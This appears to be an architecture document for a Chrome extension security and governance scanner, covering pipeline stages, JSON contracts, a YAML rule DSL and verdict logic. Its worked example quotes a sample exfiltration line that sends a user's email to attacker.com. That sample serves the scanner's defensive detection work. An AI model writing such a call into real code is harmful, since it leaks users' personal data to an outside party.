# Project Atlas: Governance Engine - Complete Architecture & Data Flow

## Executive Summary

Project Atlas implements a **dual-pipeline architecture** for Chrome extension security and governance:

- **Pipeline A (Security)**: Extract → Analyze → Score (Stages 0-1) ✅ **Complete**
- **Pipeline B (Governance)**: Facts → Evidence → Signals → Rules → Decision (Stages 2-8) ⬜ **In Progress**

This document provides the **complete HLD, data contracts, and decision flow** for the governance pipeline.

---

## System Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      PROJECT ATLAS: DUAL PIPELINE SYSTEM                     │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ┌────────────────────────────────────────────────────────────────────────┐ │
│  │                         USER INTERFACES                                │ │
│  │   ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐              │ │
│  │   │   CLI    │  │ Web UI   │  │   API    │  │   MCP    │              │ │
│  │   └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘              │ │
│  │        └──────────────┴─────────────┴─────────────┘                    │ │
│  └────────────────────────────────┬───────────────────────────────────────┘ │
│                                   │                                         │
│  ┌────────────────────────────────▼───────────────────────────────────────┐ │
│  │                   PIPELINE ORCHESTRATION (LangGraph)                   │ │
│  │                                                                        │ │
│  │  ┌──────────────────────────────────────────────────────────────┐    │ │
│  │  │  PIPELINE A: Security Analysis (Stages 0-1)                 │    │ │
│  │  │                                                              │    │ │
│  │  │  [0] Ingest → [1] Security Scan → analysis_results.json    │    │ │
│  │  │      • Permissions Analysis                                 │    │ │
│  │  │      • SAST (Semgrep custom rules)                         │    │ │
│  │  │      • VirusTotal threat intelligence                      │    │ │
│  │  │      • Entropy/obfuscation detection                       │    │ │
│  │  │      • Chrome Web Store metadata extraction                │    │ │
│  │  └──────────────────────┬───────────────────────────────────┘    │ │
│  │                         │                                         │ │
│  │                         │ (analysis_results.json)                │ │
│  │                         ▼                                         │ │
│  │  ┌──────────────────────────────────────────────────────────────┐    │ │
│  │  │  PIPELINE B: Governance Decisioning (Stages 2-8)            │    │ │
│  │  │                                                              │    │ │
│  │  │  [2] Facts Builder          → facts.json                    │    │ │
│  │  │  [3] Evidence Index Builder → evidence_index.json           │    │ │
│  │  │  [4] Signal Extractor       → signals.json                  │    │ │
│  │  │  [5] Store Listing Extractor→ store_listing.json            │    │ │
│  │  │  [6] Context Builder        → context.json                  │    │ │
│  │  │  [7] Rules Engine (DSL)     → rule_results.json             │    │ │
│  │  │  [8] Decision + Report Gen  → report.json + report.html     │    │ │
│  │  │                                                              │    │ │
│  │  └──────────────────────┬───────────────────────────────────┘    │ │
│  └───────────────────────────┼────────────────────────────────────────┘ │
│                              │                                          │
│  ┌──────────────────────────▼─────────────────────────────────────────┐ │
│  │                    PERSISTENT STORAGE                              │ │
│  │                                                                    │ │
│  │  /scans/{scan_id}/                                               │ │
│  │  ├── manifest.json (original extension manifest)                 │ │
│  │  ├── analysis_results.json (Stage 1 outputs)                    │ │
│  │  ├── facts.json (Stage 2)                                       │ │
│  │  ├── evidence_index.json (Stage 3)                              │ │
│  │  ├── signals.json (Stage 4)                                     │ │
│  │  ├── store_listing.json (Stage 5)                               │ │
│  │  ├── context.json (Stage 6)                                     │ │
│  │  ├── rule_results.json (Stage 7)                                │ │
│  │  ├── report.json (Stage 8)                                      │ │
│  │  └── report.html (Stage 8 visualization)                        │ │
│  │                                                                    │ │
│  │  Database (SQLite):                                              │ │
│  │  ├── scan_history (metadata)                                    │ │
│  │  ├── rule_cache (for reproducibility)                           │ │
│  │  └── enforcement_decisions (audit trail)                        │ │
│  └────────────────────────────────────────────────────────────────────┘ │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

---

## Stage-by-Stage Data Transformation

### Stage 0-1: Security Analysis (COMPLETE ✅)

**Input**: Extension file (CRX/ZIP) or Chrome Web Store URL

**Process**:
1. Download/extract extension
2. Parse manifest.json
3. Run all analyzers in parallel:
   - Permissions analyzer
   - SAST analyzer (Semgrep)
   - VirusTotal API
   - Entropy/obfuscation detector
   - Chrome Web Store metadata fetcher

**Output**: `analysis_results.json`
```json
{
  "permissions": ["storage", "tabs"],
  "permissions_analysis": [...],
  "sast_findings": [...],
  "virustotal": {...},
  "entropy": {...},
  "webstore": {...}
}
```

---

### Stage 2: Facts Builder

**Input**:
- `manifest.json` (from extracted extension)
- `analysis_results.json` (from Stage 1)
- Extracted file list

**Process**:
1. Normalize manifest data (permissions, scripts, CSP, etc.)
2. **Extract host access patterns** (MVP critical field):
   - From `host_permissions` (MV3)
   - From `permissions` array patterns (MV2)
   - From `content_scripts[].matches`
   - From `externally_connectable.matches`
3. Build file inventory with hashes
4. Consolidate security findings from all analyzers

**Output**: `facts.json`
```json
{
  "scan_id": "scan_123",
  "extension_id": "abcdef",
  "manifest": {
    "name": "My Extension",
    "permissions": ["storage"],
    "host_permissions": ["*://example.com/*"]
  },
  "host_access_patterns": ["*://example.com/*"],
  "file_inventory": [
    {"path": "manifest.json", "file_type": "json", "sha256": "..."}
  ],
  "security_findings": {...}
}
```

**Why It Matters**: `facts.json` is the **canonical contract** between security analysis and governance decisioning. Everything downstream depends on it.

---

### Stage 3: Evidence Index Builder

**Input**: All output files from Stages 0-2

**Process**:
1. Extract evidence items from:
   - SAST findings (file path, line number, snippet)
   - VirusTotal detections
   - Entropy findings
   - Manifest permissions
2. Hash each evidence item for reproducibility
3. Assign evidence IDs (ev_001, ev_002, etc.)

**Output**: `evidence_index.json`
```json
{
  "scan_id": "scan_123",
  "evidence": {
    "ev_001": {
      "file_path": "src/background.js",
      "file_hash": "sha256:abc123...",
      "line_start": 42,
      "snippet": "fetch('https://external-api.com')",
      "provenance": "SAST: banking.exfil.generic_channels",
      "version": 1,
      "created_at": "2026-01-22T10:00:00Z"
    }
  }
}
```

---

### Stage 4: Signal Extractor

**Input**: Facts + Evidence

**Process**:
1. Extract governance signals from facts:
   - `HOST_PERMS_BROAD` — Wildcard permissions detected
   - `SENSITIVE_API` — Uses webRequest, proxy, debugger, etc.
   - `ENDPOINT_FOUND` — External URLs in code
   - `DATAFLOW_TRACE` — Potential data exfiltration pattern
   - `OBFUSCATION` — Code obfuscation detected
2. Assign confidence scores (0.0-1.0)
3. Link to evidence items

**Output**: `signals.json`
```json
{
  "scan_id": "scan_123",
  "signals": [
    {
      "signal_id": "sig_001",
      "type": "DATAFLOW_TRACE",
      "confidence": 0.85,
      "evidence_refs": ["ev_001"],
      "description": "Data transfer to external endpoint detected",
      "severity": "high"
    }
  ]
}
```

---

### Stage 5: Store Listing Extractor

**Input**: Extension ID (from manifest)

**Process**:
1. Attempt to fetch Chrome Web Store listing
2. Parse declared data categories, purposes, third parties
3. Extract privacy policy URL
4. Always create output file (even if extraction fails)

**Output**: `store_listing.json`
```json
{
  "extraction": {
    "status": "ok|skipped|failed",
    "reason": "...",
    "extracted_at": "2026-01-22T10:00:00Z"
  },
  "declared_data_categories": ["email", "personal_name"],
  "declared_purposes": ["analytics"],
  "declared_third_parties": ["Google Analytics"],
  "privacy_policy_url": "https://example.com/privacy",
  "privacy_policy_hash": "sha256:..."
}
```

**Critical**: `extraction.status` determines if rules can rely on declared data.

---

### Stage 6: Context Builder

**Input**: Configuration (from environment or user)

**Process**:
1. Determine which rulepacks apply
2. Set regional scope
3. Select domain categories

**Output**: `context.json`
```json
{
  "context": {
    "regions_in_scope": ["GLOBAL"],
    "rulepacks": ["ENTERPRISE_GOV_BASELINE", "CWS_LIMITED_USE"],
    "domain_categories": ["general"],
    "cross_border_risk": false
  }
}
```

---

### Stage 7: Rules Engine (★ KEY STAGE ★)

**Input**:
- `facts.json`
- `signals.json`
- `store_listing.json`
- `context.json`
- Rulepacks (YAML files)

**Process**:

1. **Build evaluation context** from all JSON files
2. **For each active rulepack**:
   - Load rules from YAML
   - For each rule:
     - Parse condition string
     - Evaluate against context using DSL
     - If condition TRUE → verdict = rule.verdict
     - If condition FALSE → verdict = "ALLOW"

3. **Collect results**

**Example Rule Evaluation**:

```yaml
rule_id: "ENTERPRISE_GOV_BASELINE::R3"
condition: |
  extraction.status == "ok" AND
  signals contains type="DATAFLOW_TRACE" AND
  declared_data_categories is empty
verdict: "BLOCK"
```

**Evaluation**:
```python
# Build context
context = {
  "extraction": {"status": "ok"},
  "signals": [{"type": "DATAFLOW_TRACE", ...}],
  "declared_data_categories": []
}

# Evaluate condition
result = evaluator.evaluate(condition, context)
# (extraction.status == "ok") → TRUE
# AND (signals contains type="DATAFLOW_TRACE") → TRUE
# AND (declared_data_categories is empty) → TRUE
# Result: TRUE

# Determine verdict
verdict = "BLOCK"  # because condition is TRUE and rule says verdict="BLOCK"
```

**Output**: `rule_results.json`
```json
{
  "scan_id": "scan_123",
  "rule_results": [
    {
      "rule_id": "ENTERPRISE_GOV_BASELINE::R3",
      "rulepack": "ENTERPRISE_GOV_BASELINE",
      "verdict": "BLOCK",
      "confidence": 0.9,
      "evidence_refs": ["ev_001"],
      "citations": ["ENTERPRISE_GOV_BASELINE::GUIDE_2"],
      "explanation": "Condition matched. Verdict: BLOCK",
      "recommended_action": "Block installation — undisclosed data exfiltration risk",
      "triggered_at": "2026-01-22T10:00:00Z"
    }
  ]
}
```

---

### Stage 8: Decision + Report Generator

**Input**: All outputs from Stages 2-7

**Process**:

1. **Aggregate verdict**:
   ```
   if any rule.verdict == "BLOCK" → decision.verdict = "BLOCK"
   else if any rule.verdict == "NEEDS_REVIEW" → decision.verdict = "NEEDS_REVIEW"
   else → decision.verdict = "ALLOW"
   ```

2. **Generate rationale**:
   - Use first BLOCK rule explanation
   - Or first NEEDS_REVIEW rule explanation
   - Or "No triggered rules"

3. **Compile all evidence**

4. **Generate HTML report** for visualization

**Output**: `report.json`
```json
{
  "scan_id": "scan_123",
  "extension_id": "abcdef",
  "extension_name": "My Extension",
  "created_at": "2026-01-22T10:00:00Z",
  
  "decision": {
    "verdict": "BLOCK",
    "rationale": "Undisclosed data transfer detected",
    "action_required": "Block org-wide / remove from approved list"
  },
  
  "rule_results": [...],
  
  "summary": {
    "total_rules_evaluated": 20,
    "rules_triggered": 5,
    "block_count": 2,
    "review_count": 3,
    "allow_count": 15,
    "rulepacks_applied": [
      {"rulepack_id": "ENTERPRISE_GOV_BASELINE", "version": "1.0.0"},
      {"rulepack_id": "CWS_LIMITED_USE", "version": "1.0.0"}
    ]
  },
  
  "store_listing": {...},
  "facts": {...},
  "evidence_index": {...},
  "signals": {...}
}
```

---

## Rulepack Architecture

### Rulepack Structure

```yaml
rulepack_id: "ENTERPRISE_GOV_BASELINE"
version: "1.0.0"
name: "Enterprise Governance Baseline"
description: "..."

rules:
  - rule_id: "ENTERPRISE_GOV_BASELINE::R1"
    name: "Rule Name"
    description: "What this rule checks"
    
    condition: |
      # DSL expression: evaluate to TRUE or FALSE
      facts.host_access_patterns contains "<all_urls>" OR
      facts.host_access_patterns contains "*://*/*"
    
    verdict: "NEEDS_REVIEW"  # or "BLOCK", "ALLOW"
    confidence: 0.95
    recommended_action: "What to do if rule triggers"
    citations: ["NIST-SP-800-53::AC-3"]
    evidence_refs: []
```

### DSL Operators

| Operator | Example | Meaning |
|----------|---------|---------|
| `==` | `extraction.status == "ok"` | Equality |
| `!=` | `extraction.status != "ok"` | Inequality |
| `contains` | `signals contains type="DATAFLOW_TRACE"` | Array/string membership |
| `not contains` | `permissions not contains "tabs"` | Negation of contains |
| `is empty` | `declared_data_categories is empty` | Emptiness check |
| `is not empty` | `signals is not empty` | Non-emptiness check |
| `AND` | `condition1 AND condition2` | Logical AND |
| `OR` | `condition1 OR condition2` | Logical OR |
| `NOT` | `NOT (condition)` | Logical negation |

### Current Rulepacks (MVP)

1. **ENTERPRISE_GOV_BASELINE.yaml** (10 rules)
   - Excessive host permissions
   - Data transfer without declaration
   - Sensitive API usage
   - External endpoints
   - Code obfuscation
   - Malware detection
   - Dangerous permissions
   - Privacy policy disclosure

2. **CWS_LIMITED_USE.yaml** (10 rules)
   - CWS Limited Use policy enforcement
   - PII collection disclosure
   - Data sale prohibition
   - Third-party data sharing
   - Clipboard/storage permissions
   - Content scripts on sensitive sites
   - Network interception disclosure

---

## Data Flow Diagram (Complete Journey)

```
INPUT: Chrome Extension (CRX/URL)
   │
   ▼
┌─────────────────────────────────────────────────────┐
│  Stage 0: Ingest & Extract                         │
│  - Download from Chrome Web Store (if URL)         │
│  - Extract CRX to temporary directory              │
│  - List files                                       │
└─────────────────────┬───────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────┐
│  Stage 1: Security Analysis (Parallel)             │
│  - Permissions Analyzer                            │
│  - SAST (Semgrep + custom rules)                   │
│  - VirusTotal API                                  │
│  - Entropy Detector                                │
│  - WebStore Metadata Fetcher                       │
└─────────────────────┬───────────────────────────────┘
                      │ analysis_results.json
                      ▼
┌─────────────────────────────────────────────────────┐
│  Stage 2: Facts Builder                            │
│  - Normalize manifest                              │
│  - Extract host_access_patterns (CRITICAL)         │
│  - Build file inventory                            │
│  - Consolidate findings                            │
└─────────────────────┬───────────────────────────────┘
                      │ facts.json
                      ▼
┌─────────────────────────────────────────────────────┐
│  Stage 3: Evidence Index Builder                   │
│  - Extract evidence from all sources               │
│  - Assign evidence IDs                             │
│  - Hash for reproducibility                        │
└─────────────────────┬───────────────────────────────┘
                      │ evidence_index.json
                      ▼
┌─────────────────────────────────────────────────────┐
│  Stage 4: Signal Extractor                         │
│  - Identify governance signals                     │
│  - Assign confidence scores                        │
│  - Link to evidence                                │
└─────────────────────┬───────────────────────────────┘
                      │ signals.json
                      ▼
┌─────────────────────────────────────────────────────┐
│  Stage 5: Store Listing Extractor                  │
│  - Fetch Chrome Web Store listing (optional)       │
│  - Parse declarations                              │
│  - Always write output (even on failure)           │
└─────────────────────┬───────────────────────────────┘
                      │ store_listing.json
                      ▼
┌─────────────────────────────────────────────────────┐
│  Stage 6: Context Builder                          │
│  - Select active rulepacks                         │
│  - Set regional scope                              │
└─────────────────────┬───────────────────────────────┘
                      │ context.json
           ┌──────────┴──────────┐
           │                     │
           ▼                     ▼
    facts.json            ┌──────────────────────┐
    signals.json          │ Rulepack YAML Files  │
    store_listing.json    │ (ENTERPRISE_*)       │
                          │ (CWS_LIMITED_USE_*)  │
                          └──────┬───────────────┘
                                 │
                      ┌──────────▼──────────┐
                      │ Stage 7: Rules      │
                      │ Engine (DSL)        │
                      └──────────┬──────────┘
                                 │ rule_results.json
                                 ▼
                      ┌──────────────────────┐
                      │ Stage 8: Decision    │
                      │ + Report Generator   │
                      └──────────┬──────────┘
                                 │
                    ┌────────────┬────────────┐
                    ▼            ▼            ▼
              report.json  report.html  enforcement_bundle.zip

OUTPUT: Decision (ALLOW/BLOCK/NEEDS_REVIEW) + Evidence + Recommendations
```

---

## Decision Logic

### Verdict Aggregation Algorithm

```python
def aggregate_verdicts(rule_results: List[RuleResult]) -> str:
    """
    Deterministic verdict aggregation.
    
    Rules: If any rule says BLOCK, verdict is BLOCK.
           Else if any rule says NEEDS_REVIEW, verdict is NEEDS_REVIEW.
           Else ALLOW.
    """
    verdicts = [r.verdict for r in rule_results]
    
    if "BLOCK" in verdicts:
        return "BLOCK"
    elif "NEEDS_REVIEW" in verdicts:
        return "NEEDS_REVIEW"
    else:
        return "ALLOW"
```

### Rule Verdict Meanings

| Verdict | Meaning | Action |
|---------|---------|--------|
| `BLOCK` | Strong evidence of policy violation | Reject installation, revoke if deployed |
| `NEEDS_REVIEW` | Risk indicator, requires human judgment | Flag for security team review |
| `ALLOW` | Condition not met, no concern from this rule | No action needed |

---

## Implementation Status

### ✅ COMPLETED

- [x] `schemas.py` - All data contracts defined
- [x] `facts_builder.py` - Stage 2 implementation
- [x] `rules_engine.py` - Stage 7 implementation with DSL evaluator
- [x] `ENTERPRISE_GOV_BASELINE.yaml` - 10 MVP rules
- [x] `CWS_LIMITED_USE.yaml` - 10 MVP rules
- [x] `citations.yaml` - Policy references

### ⬜ TO IMPLEMENT

- [ ] `evidence_index_builder.py` - Stage 3
- [ ] `signal_extractor.py` - Stage 4
- [ ] `store_listing_extractor.py` - Stage 5
- [ ] `context_builder.py` - Stage 6
- [ ] `report_generator.py` - Stage 8
- [ ] Workflow integration (connect to existing pipeline)
- [ ] API endpoint: `GET /api/scan/enforcement_bundle`
- [ ] UI integration for governance views

---

## How the System Works (End-to-End)

### Example Workflow: Analyzing "DataSteal" Extension

**Input**: User uploads `datasteal.crx` or provides Chrome Web Store URL

**Stage 0-1: Security Analysis**
```
✓ Extract files
✓ Parse manifest → host_permissions: "<all_urls>"
✓ Permissions: ["storage", "webRequest"]
✓ SAST finds: fetch('https://attacker.com/steal?data=' + userEmail)
✓ VirusTotal: 2/90 vendors flag as malware
✓ WebStore: No privacy policy, declared_data_categories: []
```

**Stage 2: Facts Builder**
```
✓ Extract host_access_patterns: ["<all_urls>"]
✓ Security findings:
  - dangerous_permissions: ["storage"]
  - sast_findings: [dataflow to attacker.com]
  - virustotal_threat_level: "suspicious"
```

**Stage 4: Signal Extractor**
```
✓ HOST_PERMS_BROAD (wildcard detected)
✓ DATAFLOW_TRACE (fetch to external endpoint)
✓ SENSITIVE_API (webRequest permission)
```

**Stage 5: Store Listing**
```
✓ Fetch successful
✓ declared_data_categories: []  ← EMPTY (important!)
✓ privacy_policy_url: null
```

**Stage 7: Rules Engine Evaluation**

```yaml
Rule: ENTERPRISE_GOV_BASELINE::R3
condition: |
  extraction.status == "ok" AND
  signals contains type="DATAFLOW_TRACE" AND
  declared_data_categories is empty
verdict: "BLOCK"

Evaluation:
  ✓ extraction.status == "ok"  → TRUE
  ✓ signals contains type="DATAFLOW_TRACE"  → TRUE
  ✓ declared_data_categories is empty  → TRUE
  
Result: BLOCK ← Extension violates this rule
```

```yaml
Rule: ENTERPRISE_GOV_BASELINE::R1
condition: |
  facts.host_access_patterns contains "<all_urls>" OR
  facts.host_access_patterns contains "*://*/*"
verdict: "NEEDS_REVIEW"

Evaluation:
  ✓ facts.host_access_patterns contains "<all_urls>"  → TRUE
  
Result: NEEDS_REVIEW
```

**Stage 8: Decision**

```json
{
  "verdict": "BLOCK",
  "rationale": "Data exfiltration detected with no store listing declaration",
  "triggered_rules": [
    "ENTERPRISE_GOV_BASELINE::R3",
    "ENTERPRISE_GOV_BASELINE::R1"
  ],
  "block_rules": ["ENTERPRISE_GOV_BASELINE::R3"],
  "action_required": "Block installation org-wide"
}
```

**Output**: Report with:
- ✗ BLOCK decision
- Evidence: fetch call to attacker.com (with line number)
- Citations: CWS Limited Use policies
- Recommended action: Remove from approved list

---

## Key Design Principles

1. **Deterministic**: Same extension → same verdict every time
2. **Auditable**: Every decision links to specific evidence
3. **Declarative**: Rules are data (YAML), not code
4. **Lightweight**: No external dependencies (no OPA, Rego, etc.)
5. **Extensible**: Add new signal types, rules, rulepacks over time
6. **Evidence-First**: Chain of custody from artifact hash → file hash → code line → signal
7. **Defensive**: Rules check `extraction.status` before relying on store data

---

## Next Steps for Implementation

### Phase 1: Foundation (DONE ✅)
- ✅ Schemas locked
- ✅ Facts builder working
- ✅ Rules engine with DSL
- ✅ MVP rulepacks

### Phase 2: Pipeline (IN PROGRESS ⬜)
1. Implement remaining stage builders (3, 4, 5, 6)
2. Integrate into workflow
3. Test end-to-end

### Phase 3: API & UI (TODO)
1. Add enforcement bundle endpoint
2. Integrate governance tab in web UI
3. Add governance report visualization

### Phase 4: Monitoring & Iteration (TODO)
1. Track rule performance
2. Refine signal extraction
3. Add more rulepacks (regional, industry-specific)

---

## Questions?

See the implementation files:
- [rules_engine.py](../rules_engine.py) - DSL evaluator and verdict logic
- [ENTERPRISE_GOV_BASELINE.yaml](../rulepacks/ENTERPRISE_GOV_BASELINE.yaml) - Enterprise rules
- [CWS_LIMITED_USE.yaml](../rulepacks/CWS_LIMITED_USE.yaml) - CWS policies
- [citations.yaml](../citations.yaml) - Policy references
